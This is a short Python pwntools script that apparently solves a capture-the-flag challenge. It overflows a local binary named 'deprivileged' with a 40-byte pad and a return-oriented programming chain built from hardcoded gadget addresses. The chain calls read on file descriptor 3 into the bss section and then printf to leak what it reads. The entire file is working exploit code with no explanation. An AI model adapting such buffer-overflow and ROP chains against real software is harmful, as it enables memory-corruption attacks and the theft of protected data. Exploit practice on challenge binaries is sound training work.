import os
from pwn import *
import sys
import time

poprdi = p64(0x0000000000400a63)
poprsi = p64(0x0000000000400a61)
bss = p64(0x601100)
read = p64(0x4006d0)
printf = p64(0x4006c0)
time.sleep(.5)
payload = "A" * 40 + poprdi + p64(3) + poprsi + bss + 'AAAAAAAA'+ read + poprdi + bss + printf
p = process("./deprivileged")
time.sleep(.08)
p.sendline(payload)
print p.recv()
print p.recvline()
